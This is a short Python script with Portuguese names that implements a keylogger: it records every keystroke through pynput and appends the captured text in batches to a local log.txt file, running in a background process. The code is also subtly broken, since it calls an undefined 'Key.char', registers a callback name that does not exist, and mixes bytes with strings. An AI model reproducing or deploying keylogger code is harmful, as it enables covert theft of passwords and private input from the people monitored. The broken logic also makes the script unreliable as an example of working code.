import pynput.keyboard
import multiprocessing


log = ""

def tecla(key):
    global log
    try:
        log = log + Key.char.encode('utf-8')
    except AttributeError:
        if key == key.space:
            log = log + ' '
        else:
            log = log + str(key) + ' '
            
    if len(log) >= 50:
        arq(log)
        log = ""
        
def arq(log):
    with open('log.txt', 'a') as file:
        file.write(log)
        

def programa():
    ouvinte = pynput.keyboard.Listener(on_press=pressiona)
    ouvinte.start()

if __name__ == '__main__':
    processo = multiprocessing.Process(target=programa)
    processo.start()
